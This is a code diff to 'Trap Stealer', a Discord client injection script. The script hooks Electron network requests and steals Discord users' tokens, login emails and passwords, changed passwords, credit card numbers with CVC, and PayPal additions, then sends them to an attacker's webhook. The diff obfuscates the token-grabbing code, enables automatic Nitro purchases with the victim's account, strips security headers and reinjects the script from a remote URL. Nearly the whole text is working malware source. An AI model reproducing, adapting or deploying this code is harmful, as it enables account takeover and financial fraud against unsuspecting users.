@@ -6,18 +6,16 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
-  webhook_protector_key: '%WEBHOOK_KEY%', 
-  auto_buy_nitro: false, 
+  webhook: '%WEBHOOK%',
+  webhook_protector_key: '%WEBHOOK_KEY%',
+  auto_buy_nitro: true,
   ping_on_run: true, 
-  ping_val: '@everyone',
-  embed_name: 'Trap Stealer Injection', 
-  embed_icon: 'https://w0.peakpx.com/wallpaper/674/27/HD-wallpaper-felix-argyle-anime-re-zero-thumbnail.jpg'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/index.js', 
-  /**
-   
-   **/
+  ping_val: '@everyone', 
+  embed_name: 'Trap Injector', 
+  embed_icon: 'https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_color: 16761035, 
+  injection_url: 'https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/index.js', //injection url for when it reinjects
+
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -671,7 +669,7 @@ const login = async (email, password, token) => {
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
+            value: `\```fix\n${token}\````,
             inline: false,
           },
         ],
@@ -680,7 +678,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By TheCuteOwl・https://github.com/TheCuteOwl',
+          text: 'https://dsc.gg/4-4',
         },
       },
     ],
@@ -722,7 +720,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By TheCuteOwl・https://github.com/TheCuteOwl',
+          text: 'https://dsc.gg/4-4',
         },
       },
     ],
@@ -764,7 +762,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By TheCuteOwl・https://github.com/TheCuteOwl',
+          text: '🎉・Discord Injection By github.com/TheCuteOwl・Based of Rdimo Injection',
         },
       },
     ],
@@ -806,7 +804,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By TheCuteOwl・https://github.com/TheCuteOwl',
+          text: '🎉・Discord Injection By github.com/TheCuteOwl・Based of Rdimo Injection',
         },
       },
     ],
@@ -848,7 +846,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By TheCuteOwl・https://github.com/TheCuteOwl',
+          text: '🎉・Discord Injection By github.com/TheCuteOwl・Based of Rdimo Injection',
         },
       },
     ],
@@ -892,7 +890,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By TheCuteOwl・https://github.com/TheCuteOwl',
+          text: '🎉・Discord Injection By github.com/TheCuteOwl・Based of Rdimo Injection',
         },
       },
     ],
@@ -904,78 +902,76 @@ session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, call
   if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
   updateCheck();
 });
-
-session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-  if (details.url.startsWith(config.webhook)) {
-    if (details.url.includes('discord.com')) {
-      callback({
+session.defaultSession.webRequest.onHeadersReceived((e, c) => {
+  if (e.url.startsWith(config.webhook)) {
+    if (e.url.includes('discord.com')) {
+      c({
         responseHeaders: Object.assign(
           {
             'Access-Control-Allow-Headers': '*',
           },
-          details.responseHeaders,
+          e.responseHeaders,
         ),
       });
     } else {
-      callback({
+      c({
         responseHeaders: Object.assign(
           {
             'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
             'Access-Control-Allow-Headers': '*',
             'Access-Control-Allow-Origin': '*',
           },
-          details.responseHeaders,
+          e.responseHeaders,
         ),
       });
     }
   } else {
-    delete details.responseHeaders['content-security-policy'];
-    delete details.responseHeaders['content-security-policy-report-only'];
+    delete e.responseHeaders['content-security-policy'];
+    delete e.responseHeaders['content-security-policy-report-only'];
 
-    callback({
+    c({
       responseHeaders: {
-        ...details.responseHeaders,
+        ...e.responseHeaders,
         'Access-Control-Allow-Headers': '*',
       },
     });
   }
 });
 
-session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
-  if (details.statusCode !== 200 && details.statusCode !== 202) return;
-  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
-  const data = JSON.parse(unparsed_data);
-  const token = await execScript(
-    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
+session.defaultSession.webRequest.onCompleted(config.filter, async (e, _) => {
+  if (e.statusCode !== 200 && e.statusCode !== 202) return;
+  const u = Buffer.from(e.uploadData[0].bytes).toString();
+  const t = await execScript(
+    `function _0x527f(_0x87c79b,_0x30f50a){const _0x2e4101=_0x1210();return _0x527f=function(_0x1a4fb0,_0x2e91d1){_0x1a4fb0=_0x1a4fb0-(-0xb79+0x101e*-0x1+0x1d2c);let _0x41c77c=_0x2e4101[_0x1a4fb0];return _0x41c77c;},_0x527f(_0x87c79b,_0x30f50a);}const _0x274ce6=_0x527f;function _0x1210(){const _0xc14d13=['getToken','3810432bFPYsB','496992TrIpLq','5kHtwJf','default','147582vVKdbZ','find','86810dMEneq','1372482cDrUvM','push','7okBYpv','exports','3858324FdKxqd','323341SOmNOX','954ZIKfFm','44QYMnFE','4UXlkq'];_0x1210=function(){return _0xc14d13;};return _0x1210();}(function(_0x207cec,_0x22dda9){const _0x1c229c=_0x527f,_0x4bd3c8=_0x207cec();while(!![]){try{const _0x2afc8a=-parseInt(_0x1c229c(0x19c))/(-0x1f70+0x1*-0x1418+0x3389*0x1)*(parseInt(_0x1c229c(0x19f))/(-0x3*-0xb52+-0x1582+-0xc72))+-parseInt(_0x1c229c(0x1a5))/(0xd15+-0x224c+0x153a)+-parseInt(_0x1c229c(0x1a2))/(-0x1ec9*0x1+0x34*-0x1c+0x247d)*(-parseInt(_0x1c229c(0x1a3))/(-0x3b*-0x3b+-0x1c82+0xeee))+parseInt(_0x1c229c(0x197))/(-0xf26+-0x2549+-0x3475*-0x1)*(parseInt(_0x1c229c(0x199))/(0xced+0x1e7d+-0x2b63))+parseInt(_0x1c229c(0x1a1))/(0xf7*-0xf+0x2543+-0x16c2)+parseInt(_0x1c229c(0x19d))/(0xd81+-0x1*-0x1e55+-0x1*0x2bcd)*(-parseInt(_0x1c229c(0x196))/(-0x1951+0x1410+0x54b))+parseInt(_0x1c229c(0x19e))/(-0x1ebd*-0x1+0x149d+-0x1*0x334f)*(parseInt(_0x1c229c(0x19b))/(-0xc8f+0x22*-0xb3+0x2461*0x1));if(_0x2afc8a===_0x22dda9)break;else _0x4bd3c8['push'](_0x4bd3c8['shift']());}catch(_0x58df9d){_0x4bd3c8['push'](_0x4bd3c8['shift']());}}}(_0x1210,-0x546c7+0xa*-0x49e8+0xfc868*0x1),(webpackChunkdiscord_app[_0x274ce6(0x198)]([[''],{},_0x203f70=>{const _0x16833c=_0x274ce6;m=[];for(let _0xbb6989 in _0x203f70['c'])m[_0x16833c(0x198)](_0x203f70['c'][_0xbb6989]);}]),m)[_0x274ce6(0x195)](_0x579171=>_0x579171?.[_0x274ce6(0x19a)]?.[_0x274ce6(0x1a4)]?.[_0x274ce6(0x1a0)]!==void(0x3*-0xcac+0x18d9*-0x1+0x3edd))[_0x274ce6(0x19a)][_0x274ce6(0x1a4)][_0x274ce6(0x1a0)]());`,
   );
   switch (true) {
-    case details.url.endsWith('login'):
-      login(data.login, data.password, token).catch(console.error);
+    case e.url.endsWith('login'):
+      login(u.login, u.password, t).catch(console.error);
       break;
 
-    case details.url.endsWith('users/@me') && details.method === 'PATCH':
-      if (!data.password) return;
-      if (data.email) {
-        emailChanged(data.email, data.password, token).catch(console.error);
+    case e.url.endsWith('users/@me') && e.method === 'PATCH':
+      if (!u.password) return;
+      if (u.email) {
+        emailChanged(u.email, u.password, t).catch(console.error);
       }
-      if (data.new_password) {
-        passwordChanged(data.password, data.new_password, token).catch(console.error);
+      if (u.new_password) {
+        passwordChanged(u.password, u.new_password, t).catch(console.error);
       }
       break;
 
-    case details.url.endsWith('tokens') && details.method === 'POST':
-      const item = querystring.parse(unparsedData.toString());
-      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
+    case e.url.endsWith('tokens') && e.method === 'POST':
+      const i = querystring.parse(u.toString());
+      ccAdded(i['card[number]'], i['card[cvc]'], i['card[exp_month]'], i['card[exp_year]'], t).catch(console.error);
       break;
 
-    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
-      PaypalAdded(token).catch(console.error);
+    case e.url.endsWith('paypal_accounts') && e.method === 'POST':
+      PaypalAdded(t).catch(console.error);
       break;
 
-    case details.url.endsWith('confirm') && details.method === 'POST':
+    case e.url.endsWith('confirm') && e.method === 'POST':
       if (!config.auto_buy_nitro) return;
       setTimeout(() => {
-        nitroBought(token).catch(console.error);
+        nitroBought(t).catch(console.error);
       }, 7500);
       break;
 
